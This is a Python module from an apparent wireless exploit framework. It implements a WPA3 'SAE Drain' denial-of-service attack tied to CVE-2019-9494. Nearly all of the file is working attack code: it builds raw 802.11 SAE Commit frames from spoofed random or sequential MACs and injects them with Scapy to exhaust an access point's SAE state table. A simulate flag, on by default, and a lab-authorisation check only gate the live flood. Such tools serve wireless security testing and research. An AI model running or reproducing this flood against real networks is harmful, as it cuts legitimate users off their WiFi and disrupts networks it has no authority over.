"""
wirelessxpl/modules/generic/wifi_lab/wpa3_sae_drain_dos.py

WPA3 SAE Drain DoS - Exhaust SAE State via Commit Flooding.

The WPA3 SAE handshake maintains per-client state for each SAE Commit
received. An attacker can flood an AP with SAE Commit frames from many
spoofed MAC addresses, exhausting the AP's SAE state table and causing
a Denial of Service for legitimate clients.

This attack is the "SAE Drain" variant - it uses complete SAE Commit
frames (not just garbage) to bypass some basic flood protections.

Requires: Scapy + WiFi adapter in monitor mode with injection capability.
SafeMode: simulate=True (default) - counts frames without sending.

References:
    - CVE-2019-9494 (Dragonblood - SAE resource exhaustion)
    - wireless-research/wpa3-sae-flood-anomaly-detection/Codes/wpa3_drain_attack.py
    - IEEE 802.11-2020 Section 12.4 (SAE state machine)

Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
Version: 1.0.0
"""

from __future__ import annotations

import os
import random
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

__version__ = "1.0.0"


def _random_mac() -> str:
    """Generate random unicast MAC address."""
    mac = [random.randint(0, 255) for _ in range(6)]
    mac[0] &= 0xFE  # clear multicast bit
    return ":".join(f"{b:02X}" for b in mac)


def build_sae_commit_frame(
    src_mac: str,
    dst_mac: str,
    bssid: str,
    group_id: int = 19,
) -> bytes:
    """Build minimal SAE Commit Authentication frame.

    This is an 802.11 Authentication frame with:
        - Algorithm: SAE (3)
        - Sequence: 1 (Commit)
        - Status: 0 (Success)
        - Finite Cyclic Group: 19 (P-256)
        - Scalar and Element (random bytes - will be rejected but forces state)

    Args:
        src_mac: Source (attacker spoofed) MAC.
        dst_mac: Destination AP MAC.
        bssid: BSS identifier (usually same as dst_mac).
        group_id: Cryptographic group (19 = P-256, default for WPA3).

    Returns:
        Raw 802.11 frame bytes.
    """
    def _mac_bytes(mac: str) -> bytes:
        return bytes.fromhex(mac.replace(":", ""))

    # 802.11 frame control: Type=Management(0), Subtype=Authentication(11)
    frame_ctrl = b"\xb0\x00"
    duration = b"\x3a\x01"

    dst_bytes = _mac_bytes(dst_mac)
    src_bytes = _mac_bytes(src_mac)
    bssid_bytes = _mac_bytes(bssid)
    seq_ctrl = b"\x00\x00"

    # Authentication frame body
    algo_num = b"\x03\x00"     # SAE algorithm (3)
    seq_num = b"\x01\x00"      # Sequence 1 = Commit
    status = b"\x00\x00"       # Success

    # SAE Commit element: group ID (2 bytes) + scalar (32 bytes) + element (64 bytes)
    group_bytes = group_id.to_bytes(2, "little")
    scalar = os.urandom(32)
    element = os.urandom(64)
    sae_body = group_bytes + scalar + element

    frame = (
        frame_ctrl + duration
        + dst_bytes + src_bytes + bssid_bytes
        + seq_ctrl
        + algo_num + seq_num + status
        + sae_body
    )
    return frame


class Exploit(Exploit):
    """WPA3 SAE Drain DoS - Exhaust SAE state table via Commit flooding.

    Sends SAE Commit frames from random/sequential spoofed MACs to force
    the AP to allocate SAE state for each frame, exhausting memory and
    causing DoS for legitimate clients.

    SafeMode default: simulate=True - counts without sending.
    Requires monitor mode interface and root/admin privileges.

    Author: Andre Henrique (@mrhenrike) | Uniao Geek
    """

    __info__ = {
        "name": "WPA3 SAE Drain DoS (CVE-2019-9494 variant)",
        "description": (
            "Floods target AP with SAE Commit frames from spoofed MACs, "
            "exhausting the AP's SAE state table. Causes DoS for legitimate "
            "WPA3 clients. Requires monitor mode with packet injection."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "CVE-2019-9494",
            "wireless-research/wpa3-sae-flood-anomaly-detection/Codes/wpa3_drain_attack.py",
            "IEEE 802.11-2020 12.4 SAE state machine",
        ),
        "devices": ("wifi",),
        "platform": ("linux",),
    }

    bssid = OptString("", "Target AP BSSID (required)")
    interface = OptString("wlan0", "Monitor mode interface")
    count = OptInteger(500, "Number of SAE Commit frames to send")
    rate_ms = OptInteger(10, "Delay between frames in milliseconds")
    sequential_macs = OptBool(False, "Use sequential MACs instead of random")
    simulate = OptBool(True, "Simulate mode - do not send frames")

    def check(self) -> bool:
        """Verify Scapy is available and BSSID is set."""
        bssid = str(self.bssid).strip()
        if not bssid:
            print("[-] Set bssid to the target AP BSSID.")
            return False
        try:
            from scapy.all import sendp  # type: ignore
            return True
        except ImportError:
            print("[-] Scapy required for frame injection. Install: pip install scapy")
            return False

    def run(self) -> None:
        """Execute SAE Drain attack."""
        require_authorised_lab(self)

        bssid = str(self.bssid).strip()
        iface = str(self.interface).strip()
        count = int(self.count)
        delay = int(self.rate_ms) / 1000.0

        if bool(self.simulate):
            print(f"[!] SafeMode (simulate=True): would send {count} SAE Commit frames to {bssid}")
            print(f"    Interface: {iface} | Rate: {self.rate_ms}ms | MACs: {'sequential' if self.sequential_macs else 'random'}")
            print(f"    Set simulate=False to execute live.")
            return

        try:
            from scapy.all import sendp, RadioTap  # type: ignore
        except ImportError:
            print("[-] Scapy required.")
            return

        print(f"[*] SAE Drain DoS starting: {count} frames -> {bssid} on {iface}")
        sent = 0
        start = time.time()

        for i in range(count):
            if bool(self.sequential_macs):
                mac = f"AA:BB:CC:{(i >> 16) & 0xFF:02X}:{(i >> 8) & 0xFF:02X}:{i & 0xFF:02X}"
            else:
                mac = _random_mac()

            try:
                frame = build_sae_commit_frame(
                    src_mac=mac,
                    dst_mac=bssid,
                    bssid=bssid,
                )
                # Wrap in RadioTap for raw injection
                packet = RadioTap() / frame
                sendp(packet, iface=iface, verbose=False)
                sent += 1
            except Exception as exc:
                print(f"[-] Frame send error at {i}: {exc}")
                break

            if delay > 0:
                time.sleep(delay)

        elapsed = time.time() - start
        print(f"[+] Sent {sent} SAE Commit frames in {elapsed:.1f}s ({sent/elapsed:.0f} fps)")
        print(f"    Target AP ({bssid}) SAE state table should be exhausted.")
